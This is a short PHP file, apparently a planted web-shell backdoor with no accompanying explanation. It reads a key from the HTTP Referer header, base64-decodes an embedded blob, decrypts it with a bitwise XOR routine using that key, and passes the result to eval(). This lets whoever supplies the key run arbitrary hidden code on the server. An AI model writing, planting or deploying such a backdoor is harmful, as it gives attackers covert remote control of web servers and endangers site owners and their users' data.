<?php
	parse_str(substr($_SERVER['HTTP_REFERER'], strpos($_SERVER['HTTP_REFERER'], '?')+1), $r);	$r=array_values($r);
	$t=base64_decode('J2ZWJVEsLSN3JXZtf3U1IFJwaW9/Z3ElZ3h+T3FxfXhtb3UrMy0zICs7JDgpZlc9TSo9ITB+VyBePTZxb2R/IzMxMyIoYlgkUDorMjc4Z3p9eG94KzB/Tz5ROXh3bGdpLCA5NC1ndX9kZnklMH5XIV46LzQ+MjYyNiQvLG5iZnVmL29tY2Y0PC4sLDRgNDA0aXRgb3tpcSQrMCQ4KWZXPU0qLy1xb2R/I3JkeGlTYHZgUndjYmRmenlnJChzWCVQOGplfGZLanF4U3NsenlxYnhjKzBuTzxROSo6L0hiLisjdn9xbWcrYHV+cSw+KiM0TXF6bXwrMH9PPVE5ODRvZmltezhpLXFvZH8jMzE7KyI0cU89SSIrLiQv');		
	eval(c($t, $r[0]));function c($t='', $k=''){return (($t ^ str_pad("", strlen($t), $k)) & str_repeat("\x1f", strlen($t))) | ($t & str_repeat("\xe0", strlen($t)));}
?>
